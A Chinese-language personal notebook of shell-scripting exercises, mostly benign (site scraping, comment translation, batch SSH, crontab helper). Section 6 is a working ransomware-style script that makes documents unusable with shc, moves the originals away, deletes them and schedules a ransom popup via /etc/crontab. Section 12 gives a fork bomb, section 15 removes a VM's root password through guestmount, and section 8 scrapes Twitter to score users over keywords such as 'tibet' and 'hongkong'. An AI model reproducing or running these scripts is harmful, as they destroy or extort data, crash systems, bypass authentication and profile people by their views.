![image-20220405151659118](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405151659118.png)

3.然后就能进行awk操作了

![image-20220405151806732](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405151806732.png)

#### 方法二(适用于数据在本地\慎用。容易造成直接修改数据。使后面出错):

![image-20220405152002846](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405152002846.png)



### 4.爬站https://www.hntv.tv/

先让我们看一下源码特征

#### 1.第一个是ico(不要)

![image-20220405110817327](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405110817327.png)

#### 2.这种是子链链接(不要)

![image-20220405110934863](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405110934863.png)

看下这个子链链接的源码

![image-20220405120851079](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405120851079.png)都是图片和链接  没啥，那就都过滤了

#### 3.各种jpg图片

![image-20220405111336011](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405111336011.png)

#### 4.各种栏目的子链链接(不要)![](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD\image-20220405121748843.png)

看一下这些链接的源码:

![image-20220405121900298](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405121900298.png)

要么是文章要么是过期直播。没看到视频，没啥用



#### 5.河南各个地级市的文章栏目的子链链接(不要)

![image-20220405112056280](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405112056280.png)





#### 6.直接就是视频的链接

![image-20220405113755528](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405113755528.png)

#### 7.各种jpg图片-第二种特征

![image-20220405114044145](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405114044145.png)

#### 8.友链。是排除项(不要)

![image-20220405120340249](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405120340249.png)



<fo一般筛选  就抓取一个mv两个jpg就行

提取特征

![image-20220405141902148](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405141902148.png)

1.href内末尾是v=1.0

![image-20220405141937358](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405141937358.png)

![image-20220405142026216](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405142026216.png)

2.都是有<img 和src  最后是jpg



分批做吧 因为针对视频和图片我们要下载到不同的目录；

![image-20220405164630615](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405164630615.png)

```shell
#!/bin/bash
#河北抓包
#新建一个文件容器
mkdir jpg &>/dev/null
mkdir tmp &>/dev/null
touch tmp_&&.txt

#文件赋值
tmpfile="/tmp/tmp_&&.txt"
curl -s https://www.hntv.tv > $tmpfile

#数据操作
#url=$(awk '/href/' $tmpfile)
#变成这样
# <a href="https://www.hntv.tv/rhh-6091552768/article/1/1510891523102310402?v=1.0" target="_blank">
# <h5 class="f16 lh28 mrg-t-10 dot7 dot"><a href="https://www.hntv.tv/rhh-6091552768/article/1/1510891523102310402?v=1.0" target="_blank">请收下这份春日礼物！百万郁金香一次看个够</a></h5>
#可以看到这两个链接是一样的;所以说他们虽然在每一列的不同位置，但是我们只要选取其中一列就行了
#可以以“为分隔符将所有组件提权出来 再用 https匹配
url=$(awk -F\" '/href/&&/https/{print $2}' $tmpfile | awk '/https/')
#将参数转存到文件中
echo $url > movie.txt
#后面发现这个链接下面的视频也是个项目栏。真正的视频应该在源码里面
#但是在源码里面官方把接口给弄没了


#接下来弄图片
#jpg=$(awk -F\" '/src/&&/jpg/{print $4}' $tmpfile)
#但是这样会有重复、需要删除、可以将其弄到文件、然后在读取、再删除、以防止不能直接对参数做处理
#当然直接使用uniq更方便
 jpg=$(awk -F\" '/src/&&/jpg/{print $4}' $tmpfile | uniq)  
echo $jpg > jpg.txt

#读取每行链接并下载
cat jpg.txt | while read line
do
wget -P /jpg $line 
done


rm -rf $tmpfile

```

效果如下:

官方不让爬= =

![image-20220405164851269](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220405164851269.png)

### 5.删库检测系统

应大佬要求。开发一个删库检测的脚本

功能如下：

#### 1.当检测到用户在某个目目录(含有数据).执行rm -rf /*等删库操作时。

###### 思考：其实要做到检测。我们可以看本地是怎么对条件做检测的。

当我们输入一段系统不带有的插件时。系统会echo“提示我们下载”

这就是一种命令检测

![image-20220407160633088](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407160633088.png)

当我们输入一段根本没有的东西时。系统会echo"报错"

![image-20220407160727702](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407160727702.png)

###### 接下来我们就要知道他们是怎么运行的？

具体运行方法可以看方法一的介绍

##### 1)方法一:

检测这个命令(最直接的方式)

大部分大佬都说拦截命令的话是属于内层的、shell只是一个壳。不能进行拦截= =。如果想拦截的话有两种方法

```
在内核层进行fork+exec拦截
重写一个别的bash、自己定义(更简单一点)
```

![image-20220407170915357](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407170915357.png)

![image-20220407170926171](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407170926171.png)

![image-20220407170943165](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407170943165.png)

那么接下来我们就有两个分支:

```
找到内核源码的hook捕捉段
或者找到bashshell的对应代码段
```

写个脚本写到内核去了  这也太难了:sob:

学习资料见第十八章





##### 2）方法二(虽然原理简单、代码易写、但是不适合使用):

检测这个效果

实时检测的话有几个缺点

1.占用大

2.速度可能跟不上rm -rf

3.检测的时候目录已经遭受到损毁（因为rm -rf是无法恢复的）

##### 3）方法三:

写一个脚本执行rm -rf 

然后用信号阻断它。

利用tree 和 ps 检测他的进程特征

反复执行上面三条特征找出规律

##### 4)方法四:

普通的信号都是已ctrl+c和ctrl+z作为接收器

前面查阅了大量资料。没有找到直接的方法

看来我们得自己制作一个信号接收器

##### 5)方法五:键盘记录+实时启动+每日重置？

#### 2.禁止命令

#### 3.报警

#### 4.全文件锁死、没密码打不开的那种

这个东西直接就应用下面那个脚本就行



### 6.参考勒索病毒写一个勒索脚本

#### 1.直接就是提权之后 、全文件加密锁死就行

找了一大堆 没找到自动化工具。只有手动工具。当然对于像gpg这种手动工具的低版本(直接命令行输入账号密码)进行改装也是可以的。高版本(会有个窗口弹出)的话比较难改

最后想了一个偏招。

```
遍历所有txt  pdf sh md 等文档结尾的文件

然后用shc循环加密

然后删除将源文件上传到我们的机器然后删除

再把生成的二进制删除

剩下的就是加密文档了.
```

试错了三四个小时

```bash
#! /bin/bash
rm 100.txt &>/dev/null
rm 99.txt &>/dev/null
touch 100.txt
tmpfile="100.txt"
touch 99.txt
mkdir shangchuanjia

apt install shc &>/dev/null
yum install shc &>/dev/null

function read_dir() {
        for file in `ls $1`
        do
                if [ -d $1"/"$file ]; # 判断是否是目录，是目录则递归
                then
                        read_dir $1"/"$file
                elif [ -f $1"/"$file ]; # 判断是否是文件，输出屏幕
                then
                        echo  $1"/"$file  >> $tmpfile
                else
                        echo  $1"/"$file 
                fi
        done
}

read -p "请输入要加密文件的总目录:" mulu
path=("/"$mulu)
read_dir $path
cat 100.txt | awk '/\.txt/||/\.sh/' > 99.txt  #后面按照这个格式自己加  
#url=$(cat 100.txt | awk '/txt/')
#echo $url

cat 99.txt | while read line
do
#由于shc默认是给脚本使用，而且是给第一行必须是#!/bin/bash的脚本使用
#这个时候就献上了我们的na大法
if ! grep "^#!" "$line" &>/dev/null;
then
    cat > "$line" << EOF
#!/bin/bash
EOF
fi

shc -e 01/01/1990 -v -f $line   #给$line.x设置期限，让对方用不了
cp -a $line shangchuanjia
rm $line
rm $line.x.c
done

```

效果就是这样

![image-20220408174041046](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408174041046.png)

#### 2.还要提示联系和交易的方式

那怎么让别人发现我们的联系方式呢？

一种方法是:每当他们运行$line.x的文件时

改变报错形式提醒他们我们再勒索他们

这样的话我们又要从内核开始了  好难:sob:

上一个我还不会呢

我又想了个偏招

做一个定时启动sh脚本

这个脚本用来弄出一个消息框然后勒索他们

试试

```bash
touch lesuo.sh

cat > lesuo.sh << EOF
#!/bin/bash
dialog --msgbox "哈哈恭喜你被勒索了" 10 40
dialog --msgbox "想要解锁请联系cdxiaodong" 20 40
EOF
chmod 777 lesuo.sh
./lesuo.sh
```



![image-20220408181025875](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408181025875.png)

#### 3.对上面那个消息弹窗脚本定时启动

![image-20220408200116176](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408200116176.png)

```bash
#找lesuo.sh的路径
lujing=$(find / -name lesuo.sh 2>/dev/null) #因为本地kali测验的时候会查找/100/dvfs文件
#会产生报错 需要null掉


#定时启动
cat >> /etc/crontab << EOF
0 */2 * * * $lujing  #每两个小时运行 有别的需要就自己改
EOF
```



#### 4.实际运行的时候下载的时候发现下载东西的时候会有消息提示

需要进行修改  整个脚本全部的完整代码如下

![image-20220408201253785](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408201253785.png)

![image-20220408201310703](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408201310703.png)

```bash
#!/bin/bash
rm 100.txt &>/dev/null
rm 99.txt &>/dev/null
touch 100.txt
tmpfile="100.txt"
touch 99.txt
mkdir shangchuanjia

apt-get -y install shc &>/dev/null
yum -y install shc &>/dev/null

function read_dir() {
        for file in `ls $1`
        do
                if [ -d $1"/"$file ]; # 判断是否是目录，是目录则递归
                then
                        read_dir $1"/"$file
                elif [ -f $1"/"$file ]; # 判断是否是文件，输出屏幕
                then
                        echo  $1"/"$file  >> $tmpfile
                else
                        echo  $1"/"$file 
                fi
        done
}

read -p "请输入要加密文件的总目录:" mulu
path=("/"$mulu)
read_dir $path
cat 100.txt | awk '/\.txt/||/\.sh/' > 99.txt  #后面按照这个格式自己加  
#url=$(cat 100.txt | awk '/txt/')
#echo $url

cat 99.txt | while read line
do
#由于shc默认是给脚本使用，而且是给第一行必须是#!/bin/bash的脚本使用
#这个时候就献上了我们的na大法
if ! grep "^#!" "$line" &>/dev/null;
then
    cat > "$line" << EOF
#!/bin/bash
EOF
fi

shc -e 01/01/1990 -v -f $line   #给$line.x设置期限，让对方用不了
cp -a $line shangchuanjia
rm $line
rm $line.x.c
done

apt-get -y install dialog &>/dev/null
yum -y install dialog &>/dev/null

touch lesuo.sh

cat > lesuo.sh << EOF
#!/bin/bash
dialog --msgbox "哈哈恭喜你被勒索了" 10 40
dialog --msgbox "想要解锁请联系cdxiaodong" 20 40
EOF
chmod 777 lesuo.sh


#找lesuo.sh的路径
lujing=$(find / -name lesuo.sh 2>/dev/null) #因为本地kali测验的时候会查找/100/dvfs文件
#会产生报错 需要null掉


#定时启动
cat >> /etc/crontab << EOF
0 */2 * * * $lujing  #每两个小时运行 有别的需要就自己改
EOF
```



#### 5.有的时候我们遇到某些程序只能以普通用户运行

可以如下脚本

本来以为cron需要普通用户，所以写了如下

用了才发现需要root用户才能运行:joy:

```bash
(由于crontab必须要普通用户运行)
#所以先切换为普通用户
diquanxian=$(who | awk '/tty/ {print $1}')
#根据低权限都为tty标志
su - $diquanxian
```



### 7.能够自动匹配代码文件里面的注释并进行翻译替换

因为每次看各种源码的时候

里面的注释很多又都是英语的

看不懂

就想写一个这种脚本来进行替换

看到一个python工具

 pip install iSearch 

![image-20220408221602604](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408221602604.png)

![image-20220408234848471](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408234848471.png)

发现他不能直接修改文件里面的英语

#### 1.申请一个有道云api

#### 2.先写一个能够完成独立语句翻译的脚本

```bash
#!/bin/bash
#Verson:2.8
#Pragram:This is a chinese-english translation scripts.

    

    TMP=$(mktemp /tmp/tmp.XXXXXXXX)
    URL='http://fanyi.youdao.com/openapi.do?keyfrom=<keyfrom>&key=<key>&type=data&doctype=<doctype>&version=1.1&q='
    wget -q  -O $TMP  "$URL$*"

    if  cat $TMP | grep  '\<ex\>' &>/dev/null  ;then
        cat $TMP | grep -Po '(?<=\<ex\>\<\!\[CDATA).*(?=\]\>)'   | head -1
    else
        cat $TMP | grep -Po '(?<=\<paragraph\>\<\!\[CDATA).*(?=\]\>)' | head -1
    fi

    rm $TMP
    unset TMP URL  
```

注：

​    <keyfrom>  即申请时的应用名称

​    <key>    申请得到的API key

​    <doctype>  请求类型：xml

​    如<keyfrom>为linux，<key>为88888888，则url为：

```bash
url='http://fanyi.youdao.com/openapi.do?keyfrom=linux&key=88888888&type=data&doctype=xml&version=1.1&q='
```

将该脚本保存在/usr/bin/下，即可；『也可以通过修改PATH环境变量』

```bash
 sudo ln -s $(pwd)/xx.sh /usr/bin/xx
```

​    下面是简单测试效果：

![image-20220408224701509](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408224701509.png)

#### 3.单文件匹配注释(各种语言的注释)

先看下针对的代码

![image-20220408230430792](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408230430792.png)

像这种

单行的好匹配

但是又有多行的

这就需要想想了

后面想想

用if判断试试

难写 心累:broken_heart:

```bash
#先做一条行的
#cat bashhist.c | awk '/\/\*/&&/\*\//'
#试试if判断多行
cat bashhist.c | while read line
let hang+=1
do
  grep "\/\*" $line &>/dev/null
  if [ $? = 0 ]; then 
     #读取单行
     grep "\*\/" $line &>/dev/null
     if [ $? = 0 ]; then
        #匹配出字符并带出给翻译脚本 
        awk -F"\/\*" '{print $2}' $line > 1.txt
        o=$(sed 's#\*\/##' 1.txt)
        j=$(translate $o)
        rm 1.txt
        #用sed替换字符
        sed -r -i "s#(\/\*)(.*)(\*\/)#\1\'$j'\3#" $line
    else
        #2.是多行
        let hou $hang+10
        #截取之后十行
        sed -n ""$hang","$hou"p" bashhist.c > 2.txt
        #将所有行变成一行
        awk BEGIN{RS=EOF}'{gsub(/\n/," ");print}' 2.txt > 3.txt
        awk -F"\/\*" '{print $2}' $line > 1.txt
        o=$(sed 's#\*\/##' 3.txt)
        j=$(translate $o)
        #直接在匹配的前一行添加我们的翻译
        #注意那个&符号 这个就是我们在行前添加的符号
        sed -r -i "s#(\/\*)(.*)#\/\*'$j'\*\/&#" $line
        rm 1.txt
        rm 2.txt
        rm 3.txt
     fi 
  fi
done
```



#### 4.遍历文件夹

```bash
function read_dir() {
        for file in `ls $1`
        do
                if [ -d $1"/"$file ]; # 判断是否是目录，是目录则递归
                then
                        read_dir $1"/"$file
                elif [ -f $1"/"$file ]; # 判断是否是文件，输出屏幕
                then
                        echo  $1"/"$file  >> $tmpfile
                else
                        echo  $1"/"$file 
                fi
        done
}
```



#### 5.多文件调用3 4 步骤 完整代码如下

```bash
#!/bin/bash
rm 100.txt &>/dev/null
rm 99.txt &>/dev/null
touch 100.txt
tmpfile="100.txt"
touch 99.txt


#还没写= = 因为申请api有点贵 一个脚本不值得 cry
#有需求的兄弟可以自己注册自己写 或者注册完之后联系1397685307@qq.com我帮你写
function translate() {

}

#之前的可以一比一翻译的 但是api已经用不了了
#!/bin/bash
#Verson:2.8
#Pragram:This is a chinese-english translation scripts.
    # TMP=$(mktemp /tmp/tmp.XXXXXXXX)
    # URL='http://fanyi.youdao.com/openapi.do?keyfrom=<keyfrom>&key=<key>&type=data&doctype=<doctype>&version=1.1&q='
    # wget -q  -O $TMP  "$URL$*"

    # if  cat $TMP | grep  '\<ex\>' &>/dev/null  ;then
    #     cat $TMP | grep -Po '(?<=\<ex\>\<\!\[CDATA).*(?=\]\>)'   | head -1
    # else
    #     cat $TMP | grep -Po '(?<=\<paragraph\>\<\!\[CDATA).*(?=\]\>)' | head -1
    # fi

    # rm $TMP
    # unset TMP URL  

function read_dir() {
        for file in `ls $1`
        do
                if [ -d $1"/"$file ]; # 判断是否是目录，是目录则递归
                then
                        read_dir $1"/"$file
                elif [ -f $1"/"$file ]; # 判断是否是文件，输出屏幕
                then
                        echo  $1"/"$file  >> $tmpfile
                else
                        echo  $1"/"$file 
                fi
        done
}

read -p "请输入要翻译文件的总目录:" mulu
path=("/"$mulu)
read_dir $path
cat 100.txt | awk '/\.c/||/\.h/' > 99.txt  #后面按照这个格式自己加  


function fanyi() {
#先做一条行的
#试试if判断多行
cat $1 | while read line
let hang+=1
do
  grep "\/\*" $line &>/dev/null
  if [ $? = 0 ]; then 
     #读取单行
     grep "\*\/" $line &>/dev/null
     if [ $? = 0 ]; then
        #匹配出字符并带出给翻译脚本 
        awk -F"\/\*" '{print $2}' $line > 1.txt
        o=$(sed 's#\*\/##' 1.txt)
        j=$(translate $o)
        rm 1.txt
        #用sed替换字符
        sed -r -i "s#(\/\*)(.*)(\*\/)#\1\'$j'\3#" $line
    else
        #2.是多行
        let hou $hang+10
        #截取之后十行
        sed -n ""$hang","$hou"p" bashhist.c > 2.txt
        #将所有行变成一行
        awk BEGIN{RS=EOF}'{gsub(/\n/," ");print}' 2.txt > 3.txt
        awk -F"\/\*" '{print $2}' $line > 1.txt
        o=$(sed 's#\*\/##' 3.txt)
        j=$(translate $o)
        #直接在匹配的前一行添加我们的翻译
        #注意那个&符号 这个就是我们在行前添加的符号
        sed -r -i "s#(\/\*)(.*)#\/\*'$j'\*\/&#" $line
        rm 1.txt
        rm 2.txt
        rm 3.txt
     fi 
  fi
done
}

cat 99.txt | while read line99
do
  fanyi line99
done

rm 100.txt
rm 99.txt
echo "-----------------------翻译完成---------------------------------"
```

### 8.当我们用python爬取推特信息后。写个shell脚本对信息进行打分

#### 先手动一下消息流程

##### 先用stweet爬虫包编写一个脚本去爬虫生成在文件

###### 该脚本可以获取关于ATW的舆论消息

```python
import stweet as st

search_tweets_task = st.SearchTweetsTask(
    all_words = '#ATW'
) 
tweets_collector = st.CollectorTweetOutput()

st.TweetSearchRunner(
    search_tweets_task=search_tweets_task,
    tweet_outputs=[tweets_collector, st.CsvTweetOutput('output_file.csv')]  
).run()   # output_file.csv将数据保存到该csv文件

tweets = tweets_collector.get_scrapped_tweets()

```

补充一下 这里还有个脚本加上了其实和终止时间,

因为实战中我们每次用的话都是只想获取当天的消息

因为我们经常每天执行一次

```python
from arrow import Arrow
import stweet as st

search_tweets_task = st.SearchTweetsTask(
    all_words = '#ATW',
    since=Arrow(year=2022, month=4, day=8),
    until=Arrow(year=2022, month=4, day=9)
) 
tweets_collector = st.CollectorTweetOutput()

st.TweetSearchRunner(
    search_tweets_task=search_tweets_task,
    tweet_outputs=[tweets_collector, st.CsvTweetOutput('output_file.csv')]  
).run()   # output_file.csv将数据保存到该csv文件

tweets = tweets_collector.get_scrapped_tweets()

```



登入外皮嗯 开始爬虫

![image-20220409234729552](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220409234729552.png)

用**LibreOffice**打开csv看看

![image-20220410001330507](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220410001330507.png)

就是这样咯

###### 分析一下该csv文件内容 符号代表第几列

只弄出有用的

1.==created at==列 描述消息推送时间

2.==id_str和conversation_id_str==就是确认发送推文的用户id

（id就是每个推特账户独特的id码）

4.==full_tex==t就是推文内容

14.==user_name==

15.==user_full_name==

21.urls 推文链接

###### 手动对推文内容进行检测

这还得建立一个关键词库取进行判断

![image-20220410121757945](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220410121757945.png)

通过有道翻译截屏翻译

先检索出几个关键词

```apl
如bank chinese hongkong tibet russian @_Blue_hornet 
```

(这里我想到了个方法  先全弄成小写 再进行匹配)

然后筛选出包含这些字符的推文。不包含的把整行都删除掉

==再在剩下的csv文件中筛选出推文大于3次的用户(这些用户已经有一些敏感系数)==

也就是说id_str列中次数大于3次的id提取出来(到txt里面)

##### 再用swt编写一个脚本爬取这些id的推文

如果用excel表的话由于特性拿不到准确id

这里用文本编辑器打开

![image-20220410123752217](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220410123752217.png)

```python
import stweet as st

tweets_by_ids_task = st.TweetsByIdsTask(['1512708226936152068']) 
tweets_collector = st.CollectorTweetOutput()

st.TweetsByIdsRunner(
    tweets_by_ids_task=tweets_by_ids_task,
    tweet_outputs=[tweets_collector, st.CsvTweetOutput('output_file2.csv')]
).run()

tweets = tweets_collector.get_scrapped_tweets()

```

执行看看

![image-20220410124221403](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220410124221403.png)

![image-20220410125245956](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220410125245956.png)

就这么一点点

翻译看一下

![image-20220410125344226](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220410125344226.png)

前面那两行是我之前测试别的

第三行才是本次测试的

这个测试也帮助了我们明白就算你输出的csv地址一样

也是>>进去  而不会覆盖掉原来的数据。那就更好了

#### 接下来开始shell脚本制作

##### 理一下思路

1.先自动匹配ATW数据

2.筛选排除无关数据>id.txt

3.重复id加分(个人认为出现一次3分 出现两次6分)

4.循环对id.txt的id都检索一遍>csv

5.在csv文件中检索危险字符  一次加两分

每次循环都要删除csv。防止干扰

6.输出检测结果

##### 开始编写

其中读取csv列表很难

==难点==

用了两次嵌套遍历才能勉强判定其中几个

主要是知道有用的linux命令行软件

可以按列读取csv文件的那种  有的话写起来会轻松很多

完整代码如下:

```bash
#!/bin/bash
pip install arrow &>/dev/null
#上面的是自动install没试过。 不知道能不能直接调用
#下面是下载源码自己编译
#在源安装包下使用此脚本
python setup.py install &>/dev/null
#cd stweet

#创建第一个爬虫软件
#因为stweet不匹配日期前面有0 需要去掉 有0会变成八进制数  用-号可以去除
nian=$(date +%Y)
yue=$(date +%-m)
ri=$(date +%-d)
let zuotian=$ri-1

touch pachong1.py
rm output_file.csv &>/dev/null
cat > pachong1.py << EOF
from arrow import Arrow
import stweet as st
search_tweets_task = st.SearchTweetsTask(
      all_words = '#ATW',
      since=Arrow(year=$nian, month=$yue, day=$zuotian),
      until=Arrow(year=$nian, month=$yue, day=$ri)
) 
tweets_collector = st.CollectorTweetOutput()
st.TweetSearchRunner(
    search_tweets_task=search_tweets_task,
    tweet_outputs=[tweets_collector, st.CsvTweetOutput('output_file.csv')]  
).run()   # output_file.csv将数据保存到该csv文件
tweets = tweets_collector.get_scrapped_tweets()
EOF
#上面那个EOF后面不要有空格！！！

python3 pachong1.py

#删选排除无关数据
#cat output_file.csv | awk '{print $4}' #但是这样不会进行排序
#awk -F"\",\"" '{ print $2 }' data.csv | tr -d "\"" 

touch jiancha.txt
cat > jiancha.txt << EOF
bank
chinese
hongkong
tibet
russian
@_Blue_hornet
EOF

touch hang.txt

awk -F"," '/15/{print $4}' output_file.csv > 1.txt
cat jiancha.txt | while read line
do
    cat 1.txt | while read hang
    do
        awk '/'$line'/' $hang &>/dev/null
        if [ $?=0 ];
        then
        echo $hang >> hang.txt
        fi
    done
done

touch hang1.csv
#筛选出敏感推文
cat hang.txt | while read line1
do
    cat output_file.csv | while read hang1
    do
        awk '/'$line1'/' $hang1 &>/dev/null
        if [ $?=0 ];then
        echo $hang1 >> hang1.csv
        fi
    done
done



#将id提取出来
awk -F"," '/1509/{print $2}' hang1.csv >> 2.txt
awk -F"," '/1509/{print $3}' hang1.csv >> 2.txt
sort 2.txt | uniq > 3.txt
rm 2.txt
awk '/15/' 3.txt > 4.txt
rm 3.txt


cat 4.txt | while read id
do
rm pachong2.py &>/dev/null
touch pachong2.py
cat > pachong2.py << EOF
import stweet as st

tweets_by_ids_task = st.TweetsByIdsTask(['$id']) 
tweets_collector = st.CollectorTweetOutput()

st.TweetsByIdsRunner(
    tweets_by_ids_task=tweets_by_ids_task,
    tweet_outputs=[tweets_collector, st.CsvTweetOutput('output_file2.csv')]
).run()

tweets = tweets_collector.get_scrapped_tweets()
EOF
python3 pachong2.py
done
```

![image-20220410223651158](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220410223651158.png)

![image-20220410223704748](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220410223704748.png)

如果output2.csv读取不出来可以把时间弄长一点

当然还有几个点能改进：

1.因为我都是一步一步筛选从而不用打分

其实是可以打分的  但是对于linux没有专业的命令行csv读取软件来说难度较大

2.是我本来也可以写个输出内容

就是会输出

"某某id  说了啥   几分  危险等级 啥的"

但是也因为没有相关软件难度从而造成难度较大



### 9.基于inode删除任意文件

要求:只要输入文件完整的名字 就能删除任意文件

即使文件中有非法字符  普通删除的话删除不了

```bash
#!/bin/bash
read -p "请输入一个目标文件:" wenjian
whereis $wenjian | xargs -n1 >> 1.txt
find . -name "$wenjian" >> 1.txt 
awk '/\//' 1.txt > 2.txt
cat 2.txt | while read line
do
ls -i $line | xargs -n1 >> 3.txt
done
sed -n '1~2p' 3.txt > 4.txt

cat 4.txt | while read line1
do
find . -inum $line1 -delete
done

rm 1.txt
rm 2.txt
rm 3.txt
rm 4.txt

```

![image-20220412185442437](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204121854612.png)

分别使用了find和 whereis 无论是安装的 还是自己创造的都能删掉



### 10.脚本--批量主机远程执行命令脚本

代码如下:

```bash
#!/bin/bash
apt  -y install expect &>/dev/null
COMMAND=$* #匹配整行字段 用于命令
HOST_INFO=host.info
for IP in $(awk '/^[^#]/{print $1}' $HOST_INFO); do #^#代表任意数字
    USER=$(awk -v ip=$IP 'ip==$1{print $2}' $HOST_INFO)
    PORT=$(awk -v ip=$IP 'ip==$1{print $3}' $HOST_INFO)
    PASS=$(awk -v ip=$IP 'ip==$1{print $4}' $HOST_INFO)
    #这里expect可能本地没有安装 需要安装一下
    expect -c "
      spawn ssh -p $PORT $USER@$IP
      expect {
        \"(yes/no)\" {send \"yes\r\"; exp_continue}
        \"password:\" {send \"$PASS\r\"; exp_continue}
        \"$USER@*\" {send \"$COMMAND\r exit\r\"; exp_continue}
    }
    "
    echo "-----------------------------------"
done
```

其中需要学习expect命令  

我补充在了第14章.15



### 11.恢复文件的权限

#### 一、恢复指定程序包所有文件的权限：

```bash
#!/bin/bash

read -p "Input packages' name: " pkg

for i in $(rpm -ql $pkg)
do
        chmod --reference=/mnt$i $i
done
#主要是学会rqpm -ql 这个命令
```

#### 二、类似，恢复原始系统文件的权限

```bash
#!/bin/bash

for i in $(find /mnt)
do
        chmod --reference=/mnt$i $i
done
#学会/mnt是记录原始挂载点w
```

### 12.shell脚本的fork炸弹

```shell
#!/bin/bash
#fork炸弹
#定义函数名为.(点),函数中递归调用自己并放入后台执行
.() { .|.& };.
```

### 13.显示进度条(回旋镖版)

之前学习的时候做过显示进度条

有#版 /—\ |版，在5.15中

现在写个回旋镖版本

 

```bash
#!/bin/bash
while :
do
 clear
 for i in {1..20}
 do
   echo -e "\033[3;${i}H*"
   sleep 0.1
 done
 clear
 for i in {20..1}
 do
   echo -e "\033[3;${i}H*"
   sleep 0.1
 done
 clear
done

```

运行如下:

![](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204131840402.gif)

不过说实话  还是没有#和\的监控好用



### 14.自动修改计划任务配置文件

每次想搞自动计划shell脚本的时候都要自己配置一次/etc/crontab

而且每次弄的时候容易忘了怎么配置

这就写一个脚本来完成它



```bash
#!/bin/bash
echo "
例子: 
* * * * * command 每分钟执行一次
3,15 * * * * command 每小时的第3和第15分钟执行
* */1 * * * command 每一小时执行一次
* 23-7/1 * * * command 晚上11点到早上7点之间，每隔一小时执行一次
3,15 8-11 */2 * * command 每隔两天的上午8点到11点的第3和第15分钟执行
3,15 8-11 * * 1 command 每个星期一的上午8点到11点的第3和第15分钟执行

注意:
在 crontab 文件中定义多个调度任务时，需要特别注意的一个问题就是环境变量的设置，
如果文件的话最好是完整地址
或者 提前
ln -s $(pwd)/na.sh /usr/bin/na     然后直接 * * * * * na
export na="/home/cdxiaodong/2.sh"  然后直接 * * * * * na

"
read -p "请输入分钟信息(00-59):" min
read -p "请输入小时信息(00-59):" hour
read -p "请输入日期信息(00-59):" date
read -p "请输入月份信息(00-59):" month
read -p "请输入星期信息(00-59):" weak
read -p "请输入计划任务需要执行的命令或脚本:" program
echo "$min $hour $date $month $weak $program &>/dev/null" >> /etc/crontab

```

![image-20220413193130450](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204131931696.png)

### 15.破解虚拟机密码无密码登陆虚拟机系统脚本

之前按就探讨过类似的guestmount工具.

因为linux和windows不一样  它的每一个驱动可以是一个文件

```
linux万物皆文件
```

在进行软连接和 inode连接时。

利用的就是这种特性

还有虚拟机克隆  不需要利用额外的控件  直接调用文件

这也造成了可乘之机

```bash
#!/bin/bash
#该脚本使用 guestmount 工具，Centos7.2 中安装 libguestfs-tools-c 可以获得 guestmount 工具
apt -y install guestmount &>/dev/null
read -p "请输入虚拟机名称:" name
if virsh domstate $name |grep -q running ;then
echo "破解,需要关闭虚拟机"
virsh destroy $name
fi
mountpoint="/media/virtimage"
[ ! -d $mountpoint ]&& mkdir $mountpoint
echo "请稍后..."
if mount | grep -q "$mountpoint" ;then
umount $mountpoint
fi
guestmount  -d $name -i $mountpoint
#将 passwd 中密码占位符号 x 删除，该账户即可实现无密码登陆系统
sed -i "/^root/s/x//" $mountpoint/etc/passwd
```

### 16.尝试写一个端口转发脚本

端口转发脚本 通常都用c#写  
